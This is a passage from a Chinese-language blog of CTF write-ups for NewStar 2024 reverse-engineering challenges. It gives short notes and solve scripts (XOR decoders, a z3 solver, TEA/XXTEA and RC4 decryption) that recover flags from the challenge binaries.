class="hljs-number">0xC6</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x97</span>,<br>  <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x16</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=((a[i]&lt;&lt;<span class="hljs-number">4</span>)|(a[i]&gt;&gt;<span class="hljs-number">4</span>))%<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)//<span class="hljs-number">2</span>):<br>    a[i],a[<span class="hljs-built_in">len</span>(a)-i-<span class="hljs-number">1</span>]=a[<span class="hljs-built_in">len</span>(a)-i-<span class="hljs-number">1</span>],a[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    s+=<span class="hljs-built_in">chr</span>(a[i])<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872618528-c31541fe-239a-4bfe-8d0c-52fe72857325-173008049582711.png" class="" title="img"><h3 id="SMC-math"><a href="#SMC-math" class="headerlink" title="SMC_math"></a>SMC_math</h3><p>smc处理得好就是标准z3,可以先全undefine在force</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728885997170-be5d1767-d357-4e91-88cb-8c6df03fd85f-173008049582713.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br>v2=BitVec(<span class="hljs-string">&#x27;v2&#x27;</span>,<span class="hljs-number">32</span>)<br>v3=BitVec(<span class="hljs-string">&#x27;v3&#x27;</span>,<span class="hljs-number">32</span>)<br>v4=BitVec(<span class="hljs-string">&#x27;v4&#x27;</span>,<span class="hljs-number">32</span>)<br>v5=BitVec(<span class="hljs-string">&#x27;v5&#x27;</span>,<span class="hljs-number">32</span>)<br>v6=BitVec(<span class="hljs-string">&#x27;v6&#x27;</span>,<span class="hljs-number">32</span>)<br>v7=BitVec(<span class="hljs-string">&#x27;v7&#x27;</span>,<span class="hljs-number">32</span>)<br>v8=BitVec(<span class="hljs-string">&#x27;v8&#x27;</span>,<span class="hljs-number">32</span>)<br><br>sovler=Solver()<br>a=[]<br>sovler.add(<span class="hljs-number">5</span> * (v3 + v2) + <span class="hljs-number">4</span> * v4 + <span class="hljs-number">6</span> * v5 + v6 + <span class="hljs-number">9</span> * v8 + <span class="hljs-number">2</span> * v7==<span class="hljs-number">0xD5CC7D4FF</span>)<br>sovler.add(<span class="hljs-number">4</span> * v8 + <span class="hljs-number">3</span> * v5 + <span class="hljs-number">6</span> * v4 + <span class="hljs-number">10</span> * v3 + <span class="hljs-number">9</span> * v2 + <span class="hljs-number">9</span> * v7 + <span class="hljs-number">3</span> * v6==<span class="hljs-number">0x102335844B</span>)<br>sovler.add(<span class="hljs-number">9</span> * v6 + <span class="hljs-number">4</span> * (v5 + v4) + <span class="hljs-number">5</span> * v3 + <span class="hljs-number">4</span> * v2 + <span class="hljs-number">3</span> * v8 + <span class="hljs-number">10</span> * v7==<span class="hljs-number">0xD55AEABB9</span>)<br>sovler.add(<span class="hljs-number">9</span> * v3 + <span class="hljs-number">5</span> * v2 + <span class="hljs-number">9</span> * v8 + <span class="hljs-number">2</span> * (v4 + <span class="hljs-number">2</span> * v5 + <span class="hljs-number">5</span> * v6 + v7)==<span class="hljs-number">0xF89F6B7FA</span>)<br>sovler.add(<span class="hljs-number">5</span> * v6 + <span class="hljs-number">9</span> * v5 + <span class="hljs-number">7</span> * v2 + <span class="hljs-number">2</span> * v3 + v4 + <span class="hljs-number">3</span> * v8 + <span class="hljs-number">9</span> * v7==<span class="hljs-number">0xD5230B80B</span>)<br>sovler.add(<span class="hljs-number">8</span> * v8 + <span class="hljs-number">6</span> * v5 + <span class="hljs-number">10</span> * v4 + <span class="hljs-number">5</span> * v3 + <span class="hljs-number">6</span> * v2 + <span class="hljs-number">3</span> * v7 + <span class="hljs-number">9</span> * v6==<span class="hljs-number">0x11E28ED873</span>)<br>sovler.add(v2 + <span class="hljs-number">4</span> * (v4 + v3 + <span class="hljs-number">2</span> * v5) + <span class="hljs-number">9</span> * v6 + v7 + <span class="hljs-number">3</span> * v8 == <span class="hljs-number">0xB353C03E1</span>)<br><span class="hljs-keyword">if</span> sovler.check()==sat:<br>    model=sovler.model()<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v2].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v3].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v4].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v5].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v6].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v7].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(model[v8].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="wtf"><a href="#wtf" class="headerlink" title="wtf"></a>wtf</h3><p>交叉引用input都下好断点，然后调试运行看程序逻辑，发现先-0xe9再^i</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728887580659-6c62defc-51fa-49ca-9abf-4073fd14af66-173008049582715.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x4F</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x41</span>,<br>  <span class="hljs-number">0x26</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3B</span>,<br>  <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x70</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>  a[i]=a[i]^i<br>  s+=<span class="hljs-built_in">chr</span>((a[i]-<span class="hljs-number">0xe9</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><h3 id="011vm"><a href="#011vm" class="headerlink" title="011vm"></a>011vm</h3><p>用d810去混淆但不完全</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889707348-55a2f455-2123-47a2-bf01-42e3fe7b3543-173008049582717.png" class="" title="img"><p>进入3b30，一个打印一个tea，找到tea的所有参数，前后一一对应</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889970695-8645eadd-ba24-4185-a00d-cfc483e809e4-173008049582719.png" class="" title="img"><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889691026-4e86b5cf-3890-4b7d-8940-d946bad62f07-173008049582721.png" class="" title="img"><p>上面是密钥，下面是密文</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728889636547-9cd094cb-7497-42dc-bff6-6bdae2144603-173008049582723.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9E3779B9</span>;<br>    <span class="hljs-type">uint32_t</span> v2[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span>&#125;, v3[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span>&#125;, v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x38B97E28</span>,<span class="hljs-number">0xB7E510C1</span>,<span class="hljs-number">0xB4B29FAE</span>,<span class="hljs-number">0x5593BBD7</span>,<span class="hljs-number">0x3C2E9B9E</span>,<span class="hljs-number">0x1671C637</span>,<span class="hljs-number">0x8F3A8CB5</span>,<span class="hljs-number">0x5116E515</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x11121314</span>,<span class="hljs-number">0x22232425</span>,<span class="hljs-number">0x33343536</span>,<span class="hljs-number">0x41424344</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m=<span class="hljs-number">0</span>;m&lt;<span class="hljs-number">8</span>;m+=<span class="hljs-number">2</span>)&#123;<br>sum = delta*(<span class="hljs-number">32</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + sum) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + sum) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;     <br>&#125; <br><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="flowering-shrubs"><a href="#flowering-shrubs" class="headerlink" title="flowering_shrubs"></a>flowering_shrubs</h3><p>静态去花指令发现是函数嵌套函数，吓了一跳，果断选择动态，发现还是一样</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728903450698-3e1a6b8c-7b6f-4d91-81a2-008992f3f637-173008049582725.png" class="" title="img"><p>密文一次循环变化四位，逻辑在上面</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728903840218-727b0b2b-4812-4598-a3d7-2b5261f91a51-173008049582827.png" class="" title="img"><p>调试出对应关系，这样就不用管随机数了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0-&gt;u</span><br><span class="hljs-string">1-&gt;a</span><br><span class="hljs-string">8-&gt;r</span><br><span class="hljs-string">3-&gt;e</span><br><span class="hljs-string">2-&gt;f</span><br><span class="hljs-string">6-&gt;i</span><br><span class="hljs-string">4-&gt;r</span><br><span class="hljs-string">5-&gt;s</span><br><span class="hljs-string">7-&gt;t</span><br><span class="hljs-string">9-&gt;.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>s=<span class="hljs-string">&#x27;uafersitr.&#x27;</span><br><br>a=[<span class="hljs-number">0x54</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xE0</span>,<br>   <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x39</span>,<br>   <span class="hljs-number">0x76</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xC9</span>,<br>   <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x3E</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)*<span class="hljs-number">4</span>,<span class="hljs-number">4</span>):<br>    a[i]=a[i]^a[i+<span class="hljs-number">3</span>]<br>    a[i+<span class="hljs-number">3</span>]^=a[i+<span class="hljs-number">2</span>]<br>    a[i+<span class="hljs-number">2</span>]=a[i+<span class="hljs-number">2</span>]+<span class="hljs-built_in">ord</span>(s[i//<span class="hljs-number">4</span>])<br>    a[i+<span class="hljs-number">2</span>]^=a[i+<span class="hljs-number">1</span>]<br>    a[i+<span class="hljs-number">1</span>]=a[i+<span class="hljs-number">1</span>]-<span class="hljs-built_in">ord</span>(s[i//<span class="hljs-number">4</span>])<br>    a[i+<span class="hljs-number">1</span>]^=a[i]<br>    a[i]^=<span class="hljs-built_in">ord</span>(s[i//<span class="hljs-number">4</span>])<br>    <span class="hljs-comment"># print(a)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i])%<span class="hljs-number">256</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i+<span class="hljs-number">1</span>])%<span class="hljs-number">256</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i+<span class="hljs-number">2</span>])%<span class="hljs-number">256</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i+<span class="hljs-number">3</span>])%<span class="hljs-number">256</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#flag&#123;y0u_C4n_3a51ly_Rem0v3_CoNfu510n-!!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="SecretsofKawayi"><a href="#SecretsofKawayi" class="headerlink" title="SecretsofKawayi"></a>SecretsofKawayi</h3><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729043419776-25a4e284-f09d-49e5-be70-91ddc3184820-173008051395929.png" class="" title="img"><p>先rc4再base64</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729043442784-9b9a2b70-6299-4085-968e-1f4b20b1c4f9-173008051395931.png" class="" title="img"><p>so文件先脱壳，发现是魔改xxtea</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729043503402-3f034b51-e79a-4662-9b04-cfdbc34f1f72-173008051395933.png" class="" title="img"><p>注意轮数与反编译的结果不一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x21524111</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;3) + (y&gt;</span>&gt;3^z&lt;&lt;2)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;         <br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = (-rounds)*DELTA;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n<span class="hljs-number">-1</span>; p &gt;<span class="hljs-number">0</span>; p--) &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] -= MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] -= MX;<br>            sum += DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) &#123;  <br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = (-rounds) * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum += DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">12</span>] = &#123;<span class="hljs-number">0x8C12D3DF</span>, <span class="hljs-number">0x5F4C4137</span>, <span class="hljs-number">0x1A9D3D02</span>, <span class="hljs-number">0x2D1294B7</span>, <span class="hljs-number">0xFB622B37</span>, <span class="hljs-number">0xD18D84E3</span>, <span class="hljs-number">0x064C4592</span>, <span class="hljs-number">0x16985CAB</span>, <span class="hljs-number">0xFDB06D69</span>,<span class="hljs-number">0xFB30B1E3</span>,<span class="hljs-number">0x925C2FD3</span>,<span class="hljs-number">0x2E1BB40C</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x776F656D</span>, <span class="hljs-number">0x6F656D7E</span>, <span class="hljs-number">0x65747E77</span>, <span class="hljs-number">0x7E7E7E61</span>&#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">12</span>;<span class="hljs-comment">//注意这里与数组长度相等 </span><br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i ++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i]&amp;<span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x,&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>import base64<br>def <span class="hljs-title function_">rc4</span><span class="hljs-params">(data, key)</span>:<br>    S = <span class="hljs-built_in">list</span>(range(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % len(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-type">char</span> in data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(<span class="hljs-type">char</span> ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> bytes(out)<br><br><br>data = bytes([<span class="hljs-number">113</span>, <span class="hljs-number">71</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">84</span>, <span class="hljs-number">56</span>, <span class="hljs-number">107</span>, <span class="hljs-number">115</span>, <span class="hljs-number">98</span>, <span class="hljs-number">118</span>, <span class="hljs-number">72</span>, <span class="hljs-number">105</span>, <span class="hljs-number">102</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">77</span>, <span class="hljs-number">89</span>, <span class="hljs-number">100</span>, <span class="hljs-number">113</span>, <span class="hljs-number">47</span>, <span class="hljs-number">104</span>, <span class="hljs-number">66</span>, <span class="hljs-number">115</span>, <span class="hljs-number">112</span>, <span class="hljs-number">82</span>, <span class="hljs-number">76</span>, <span class="hljs-number">52</span>, <span class="hljs-number">67</span>, <span class="hljs-number">82</span>, <span class="hljs-number">122</span>, <span class="hljs-number">70</span>, <span class="hljs-number">86</span>, <span class="hljs-number">79</span>, <span class="hljs-number">47</span>, <span class="hljs-number">89</span>, <span class="hljs-number">98</span>, <span class="hljs-number">103</span>, <span class="hljs-number">78</span>, <span class="hljs-number">89</span>, <span class="hljs-number">100</span>, <span class="hljs-number">67</span>, <span class="hljs-number">103</span>, <span class="hljs-number">61</span>, <span class="hljs-number">61</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>])<br>key = b<span class="hljs-number">&#x27;</span>rc4k4y<span 